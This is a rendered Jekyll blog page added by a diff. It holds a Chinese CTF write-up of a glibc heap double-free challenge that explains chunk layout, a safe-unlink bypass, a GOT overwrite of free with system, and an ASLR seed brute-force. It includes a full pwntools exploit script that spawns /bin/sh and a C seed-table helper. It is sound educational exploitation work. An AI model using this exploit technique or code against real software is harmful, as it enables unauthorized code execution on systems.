@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>20171004</title>
+  <meta name="description" content="前言">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="http://localhost:4000/jekyll/update/2019/01/02/20171004.html">
+  <link rel="alternate" type="application/rss+xml" title="Your awesome title" href="http://localhost:4000/feed.xml">
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">Your awesome title</a>
+
+    <nav class="site-nav">
+      <a href="#" class="menu-icon">
+        <svg viewBox="0 0 18 15">
+          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
+          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
+          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
+        </svg>
+      </a>
+
+      <div class="trigger">
+        
+          
+          <a class="page-link" href="/about/">About</a>
+          
+        
+          
+        
+          
+        
+          
+        
+      </div>
+    </nav>
+
+  </div>
+
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">20171004</h1>
+    <p class="post-meta"><time datetime="2019-01-02T21:01:05+08:00" itemprop="datePublished">Jan 2, 2019</time></p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <h2 id=">前言</h2>
+
+<p>第一次做Linux的漏洞利用，最后搞到凌晨4点终于弄好了。。。现在做下笔记吧，我尽量写的详细点，是给自己看的也是给其他没玩过Linux漏洞利用的新手看的，大神可以绕道了，哈哈<br>
+首先这是一道double free的题目，顾名思义，就是把一个malloc出来的内存释放两次，在这之前我先简单介绍一下linux的堆管理机制。。。这方面的资料比较全，所以我这边不会说的很详细，只会说这道题需要用到的部分，，，<br>
+<a href="https://bbs.pediy.com/thread-218313.htm">https://bbs.pediy.com/thread-218313.htm</a><br>
+<a href="http://www.freebuf.com/articles/system/91527.html">http://www.freebuf.com/articles/system/91527.html</a><br>
+<a href="http://www.cnblogs.com/alisecurity/p/5486458.html">http://www.cnblogs.com/alisecurity/p/5486458.html</a><br>
+这些资料都是不错的。。。</p>
+
+<h2 id=">基础知识</h2>
+
+<p>但这道题，就记住以下几点：</p>
+
+<ol>
+<li>linux中，有一个或多个内存segment作为堆使用，这点与windows一样</li>
+<li>这些segment会有某种数据结构(bins)，用于表示当前堆的分配状态，即，哪个区域的内存是chunk1，哪个是chunk2(chunk可以把它理解成malloc出来的那片内存)</li>
+<li>堆的管理由操作系统完成（当蓝啦</li>
+</ol>
+
+<p>那么这个数据结构是什么样的呢，很复杂，我这里不可能全部讲清楚，做这道题只要记住这几点：</p>
+
+<ol>
+<li>被释放的堆块(chunk)，会被维护在某个链表中，如果是比较小的chunk(16bytes-64bytes)，就是某个单项链表，比较大的，就是双向链表</li>
+<li>正在使用的chunk，不会在这个链表中，所以，当malloc的时候，chunk会从链表中被卸下，然后把指向数据块的指针返回给程序</li>
+<li>释放chunk时，如果发现前一个chunk(内存上相邻的前一个，不是链表中的前一个)也是被释放的状态，那么操作系统就会把前面那个chunk卸下来(这里就是利用漏洞的点！！！)，然后把要被释放的chunk和它前面的chunk合并成一个大chunk，并插入链表(注意，这一条并不是对于所有chunk都适用的，比较小的16-64bytes的就不会这么拼，但是我在这道题里申请的都是比较大的chunk)</li>
+</ol>
+
+<p>好的，现在来看看chunk的数据结构长啥样。。。</p>
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">malloc_chunk</span> <span class="p">{</span>
+  <span class="cm">/* #define INTERNAL_SIZE_T size_t */</span>
+  <span class="n">INTERNAL_SIZE_T</span>      <span class="n">prev_size</span><span class="p">;</span>  <span class="cm">/* Size of previous chunk (if free).  */</span>
+  <span class="n">INTERNAL_SIZE_T</span>      <span class="n">size</span><span class="p">;</span>       <span class="cm">/* Size in bytes, including overhead. */</span>
+  <span class="k">struct</span> <span class="n">malloc_chunk</span><span class="o">*</span> <span class="n">fd</span><span class="p">;</span>         <span class="cm">/* double links -- used only if free. 这两个指针只在free chunk中存在*/</span>
+  <span class="k">struct</span> <span class="n">malloc_chunk</span><span class="o">*</span> <span class="n">bk</span><span class="p">;</span>
+
+  <span class="c1">//如果chunk是被释放状态，那么这里就啥都没有，是一片未被使用的内存
+</span>  <span class="c1">//如果是使用状态，那么这里跟着前面的fd,bk，都是用户数据块
+</span>  <span class="c1">//本来这里还有两个指针的，但是是只对large block有用的，我们这里用不上，我们申请的只是中等大小的chunk，所以不写。。。
+</span> <span class="p">};</span>
+</code></pre></div>
+<p>prev size是<strong>内存位置</strong>上，前一块内存的大小，如果前一块内存是被释放状态的话(如果不是，这个8字节貌似就是属于前一块chunk的用户数据部分)</p>
+
+<p>size是自己这个chunk的大小，包括上面的4个成员变量的32字节以及后面未被使用的内存，但是因为始终要8字节对齐，所有后三位始终是0，浪费这三位不好，所有就在这里弄了3个flag，其中两个不讲，但是最低位(0bit)是代表<strong>前一个</strong>的chunk是否正在被使用，如果是，那就是1，不是，就是0。<br>
+那么为什么他要这么做？自己的chunk里面不放自己是否被使用放别人是否被使用干嘛？？？还记不记得在前面我说过的合并操作，释放一个chunk时需要知道前面一个chunk是否被使用，如果没有就要合并，我们通过记录上一个chunk是否被使用，可以判断是否需要进行合并操作。如果只记录自己的，我怎么知道前面一个chunk是不是正在被使用的？prev_size是只在前一个free的时候才用的喔，如果前一个正在被使用这个字段是用户数据，没法定位到上一个chunk的开始位置，所以就没法知道上一个chunk的使用情况。但是记录前一个的使用情况呢，既可以知道前一个的使用情况，也可以通过size字段定位到下一个chunk获取自身的使用情况，efficiency比记录自己的使用情况不知道高到哪里去了。。。<br>
+扯远了，继续说fd和bk，这两个字段就很明了了，就是双向链表的前一个和后一个，(如果是单向链表就只会用其中一个但是这里我们不考虑。。)，注意这个fd是链表上的前一个，而不是内存上的前一个，所以prev_size跟fd指向的东西八杆子打不着关系。。。</p>
+
+<h2 id=">解题</h2>
+
+<p>好的，回到这一题，拿到这一题，随便手工fuzz一下，比方说在回显的地方%d一下啊(格式化字符串)，输入超长字符串啊(缓冲区溢出)，&quot;&gt;&lt;img src=x&gt;啊(走错片场的xss(误))，之类的。。。最后发现delete box两次的时候，会爆出异常，很容易想到就是double <br>
+free。。。<br>
+现在我们来构造几个box：</p>
+
+<ul>
+<li><p>get small size:256</p></li>
+<li><p>get normal size:272</p></li>
+<li><p>free small</p></li>
+<li><p>free normal</p></li>
+<li><p>get big size:544 <br>
+注意，此时big box的堆内存地址与small box(已被释放)的起始地址相同！因为256+16(prev_size与size)+272=544，按照顺序释放small和normal之后，这两个chunk会被合并，大小刚好是544+16(这个16是这个chunk的prev_size和size，但是用户可使用内存就是544，所以申请544会返回这个chunk)，具体可以看这位大神的文章<a href="https://bbs.pediy.com/thread-218395.htm%EF%BC%8C%E6%88%91%E6%87%92%E5%BE%97%E7%94%BB%E5%9B%BE%E4%BA%86%EF%BC%88%E9%80%83">https://bbs.pediy.com/thread-218395.htm，我懒得画图了（逃</a><br>
+这个时候，normal的所有数据，我们都已经可以操控了，包括prev_size和size，我们再free normal的话，从这个chunk中所获取到的信息都是我们可以伪造的！</p></li>
+</ul>
+
+<p>​</p>
+
+<p>这个时候，假如我们伪造一个prev_size，并把size的0bit设为0表示前一个chunk是空闲的，并且在前面再伪造一个chunk并伪造其prev_size和size，就可以让操作系统合并这两个chunk，其间会把前面那个我们伪造的chunk卸下来先，这就会造成unlink的漏洞利用！造成经典的DWORD SHOOT！<br>
+  但是，如果我们要unlink p，safe unlink会先检查p-&gt;fd-&gt;bk == p &amp;&amp; p-&gt;bk-&gt;fd == p，这就比较麻烦了。但是还是有可乘之机！我们假如在内存中找到一个p_addr地址，使得其中内容是指向p的指针，那么让fd为p_addr-0x18，bk为p_addr-0x10，就可以执行unlink，unlink后使得p_addr的值为p_addr-0x18 </p>
+
+<p>那么，哪里有这么一个符合我们条件的p_addr呢？我们IDA打开这个程序，发现box的指针都是全局变量！那么就了然了，我们让p_addr为存放big box的地址，就可以完美地绕过safe unlink！这个时候，big box的指针不再指向堆，而是全局变量——little box的指针的地址，此时如果我们再edit big box，便可以影响所有box的指针。<br>
+  影响了有什么用？首先我们改变box指针后edit可以实现任意写内存，而show msg in box可以实现任意读内存，而且，我们的目标是执行system(&quot;/bin/sh&quot;)</p>
+
+<h2 id="exploit">所以exploit的步骤：</h2>
+
+<ol>
+<li>get little box with size 0x20</li>
+<li>leave message &quot;/bin/sh&quot; in little box</li>
+<li><p>get_box(2, 0x100) #get small box<br>
+get_box(3, 0x110) # get normal box<br>
+free_box(2) #free small box<br>
+free_box(3) #free normal box<br>
+get_box(4, 0x220) # get big box,现在big box会和small box有同样的初始地址，如前面所说</p></li>
+<li><p>leave the payload into box 4(big box)</p></li>
+<li><p>double free normal box, 现在big box的指针指向little box的指针的地址</p></li>
+<li><p>show message big box,获取&quot;/bin/sh&quot;的地址</p></li>
+<li><p>leave message to big box: bin_sh_addr + &#39;\x00\x00&#39; + p64(p_addr+ displ_to_free) + bin_sh_addr + &#39;\x00\x00&#39;<br>
+​<br><br>
+little box                              small <br>
+box                                normal box<br>
+​    此时p_addr+ displ_to_free是free的GOT表地址，这是个啥呢？其实就类似于windows下的IAT表，里面的内容是free函数的函数指针。我们这样就可以读取small box的内容，从而获取free函数的地址，我们要他干嘛？因为libc有ASLR，我们需要先获取free地址，然后才能计算出system的地址。</p></li>
+<li><p>show message in small box, 计算system地址</p></li>
+<li><p>leave message in small box，把free替换成system<br>
+10.<br>
+delete normal <br>
+box，这时free已经是system了，所以free(normal_box)实际上是system(normal_box)，而normal <br>
+box中实际上是&quot;/bin/sh&quot;(如步骤7)，所以system(&quot;/bin/sh&quot;)，get shell！</p></li>
+</ol>
+
+<p>还有，这个./club也是有ASLR的，所以p_addr的地址不能直接得到，我们逆向一下这个程序的话，发现猜随机数可以获得seed地址，从而可以计算出p_addr。<br>
+这个随机数就比较简单了，第一次我们猜错，他会告诉我们第一次的随机数rand()的值，拿这个可以逆推出seed，因为seed是seed的地址取低32位，会有低12位是固定的，所以很容易穷举出来，我是弄了个json。。</p>
+<div class="highlight"><pre><code class="language-Python" data-lang="Python">import json
+import os
+
+from pwn import *
+from subprocess import Popen, PIPE
+
+g_local = True
+
+if g_local:
+    sh=process("./club")
+    #raw_input("ida has attch? Press any key for continue...")
+else:
+    sh=remote("123.206.22.95",8888)
+
+def getPrevNum(str):
+    i = 0
+    while (i &lt; len(str)):
+        if (str[i] &lt; '0' or str[i] &gt; '9'):#not digit
+            break
+        i = i + 1
+    return str[0:i]
+
+def get_seed(first_rand):
+    f = open("rand_to_seed.json")
+    to_seed = json.load(f)
+    seed = to_seed[first_rand]
+    return seed
+
+def get_scd_rand_from_seed(seed):
+    pipe = os.popen( "./get_scd_rand " + str(seed))
+    scd_rand = pipe.read()
+    pipe.close()
+    return int(scd_rand)
+
+def get_scd_rand(first_rand):
+    return get_scd_rand_from_seed(get_seed(str(first_rand)))
+
+def six_ops():
+#pre: init state, post: ops input
+    global sh
+    sh.recvuntil("6) exit\n&gt; ")
+
+def get_base_addr():
+#pre: in ops input, post: next ops input
+#return secret number that is the addr of seed
+    global sh
+    sh.send("5")#gess number
+    sh.recvuntil("&gt; ")
+    sh.send("1")#arbitrary number
+    sh.recvuntil("The number is ")
+    fst_rand = int(getPrevNum(sh.recv()))
+    print fst_rand
+    sh.send("5")#gess number
+    sh.recvuntil("&gt; ")
+    sh.send(str(get_scd_rand(fst_rand)))
+    sh.recvuntil("You get a secret: ")
+    secret = int(getPrevNum(sh.recv()))
+    return secret
+
+def get_box(which_box, iSize):
+#pre: in ops input, post: next ops input
+    global sh
+    sh.send("1")#get a box
+    sh.recvuntil("5) huge\n&gt; ")
+    sh.send(str(which_box))
+    sh.recvuntil("Input the size you want to get:\n&gt; ")
+    sh.send(str(iSize))
+    sh.recvuntil("6) exit\n&gt; ")
+
+def free_box(which_box):
+#pre: in ops input, post: next ops input
+    global sh
+    sh.send("2")#destroy a box
+    sh.recvuntil("5) huge\n&gt; ")
+    sh.send(str(which_box))
+    print sh.recvuntil("6) exit\n&gt; ")
+
+def leave_msg(which_box, msg):
+    sh.send("3")#leave msg in a box
+    sh.recvuntil("5) huge\n&gt; ")
+    #print which_box
+    sh.send(str(which_box))
+    sh.send(msg + '\n')
+    sh.recvuntil("6) exit\n&gt; ")
+
+def show_msg(which_box):
+    sh.send("4")#show msg in the box
+    sh.recvuntil("5) huge\n&gt; ")
+    sh.send(str(which_box))
+    ret = sh.recvuntil("6) exit\n&gt; ")
+    endIdx = ret.find("You have 6 operation") - 1
+    return ret[0:endIdx]
+
+seed_to_p_addr = -40
+displ_to_free = -0x108
+free_off = 0x00000000000844f0
+system_off = 0x0000000000045390
+
+six_ops()
+seed_addr = get_base_addr()
+
+get_box(1, 0x20)
+leave_msg(1, "/bin/sh\x00")
+
+get_box(2, 0x100)
+get_box(3, 0x110)
+free_box(2)
+free_box(3)
+get_box(4, 0x220)
+
+p_addr = seed_addr + seed_to_p_addr
+payload = p64(0)+p64(0x101)+p64(p_addr-0x18)+p64(p_addr-0x10)+'A'*(0x100-0x20)+p64(0x100)+p64(0x220-0x100)
+leave_msg(4, payload)
+
+free_box(3)#double free
+print "after double free, now box 4 pointer has changed and point to p_addr-0x18(box 1)"
+
+bin_sh_addr = show_msg(4)
+
+payload_leak = bin_sh_addr + '\x00\x00' + p64(p_addr+ displ_to_free) + bin_sh_addr + '\x00\x00' #+ bin_sh_addr + '\x00\x00'#p64(p_addr-0x18+displ_to_free+0x10)
+
+leave_msg(4, payload_leak)
+free_addr = show_msg(2)
+ufree_addr = u64(free_addr + "\x00\x00")
+print hex(ufree_addr - free_off + system_off)
+leave_msg(2, p64(ufree_addr - free_off + system_off))
+sh.send("2")#destroy a box
+sh.recvuntil("5) huge\n&gt; ")
+sh.send(str("3"))
+
+#leave_msg(4, num_of_As * 'A')
+#print show_msg(4).split()
+print "succeed"
+
+
+sh.interactive()
+
+
+
+#small 256
+#normal 272
+#free them
+#big 544
+#free normal again
+
+</code></pre></div><div class="highlight"><pre><code class="language-C" data-lang="C">#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#define SEED_OFF 0x202148
+void proc_srand(unsigned int i)
+{
+    srand((unsigned int)(i + SEED_OFF));
+    printf("\"%d\":%u,", rand(), (unsigned int)(i + SEED_OFF));
+}
+
+int main()
+{
+    //system("/bin/sh");
+    printf("{");
+    unsigned int i;
+    for (i = 0x00000000; i &lt; 0xffffe000; i += 0x1000)
+    {
+        proc_srand(i);
+        /*if (i + SEED_OFF == 0x75b4148)
+            getchar();*/
+    }
+    proc_srand(i);
+    i += 0x1000;
+    srand((unsigned int)(i + SEED_OFF));
+    printf("\"%d\":%u}", rand(), (unsigned int)(i + SEED_OFF));
+}
+
+/*
+0x000055dd139ce000
+0x000055ce8c5e3000
+0x000055aaadb17000
+0x00005610214b0000
+0x0000558f744b5000
+0x000056038011e000
+0x0000564d46904000
+0x0000556e073b2000
+*/
+
+</code></pre></div>
+  </div>
+
+</article>
+
+      </div>
+    </div>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Your awesome title</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li>Your awesome title</li>
+          <li><a href="mailto:your-email@domain.com">your-email@domain.com</a></li>
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-2">
+        <ul class="social-media-list">
+          
+          <li>
+            <a href="https://github.com/jekyll"><span class="icon icon--github"><svg viewBox="0 0 16 16"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
+</span><span class="username">jekyll</span></a>
+
+          </li>
+          
+
+          
+          <li>
+            <a href="https://twitter.com/jekyllrb"><span class="icon icon--twitter"><svg viewBox="0 0 16 16"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
+</span><span class="username">jekyllrb</span></a>
+
+          </li>
+          
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-3">
+        <p>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.
+</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
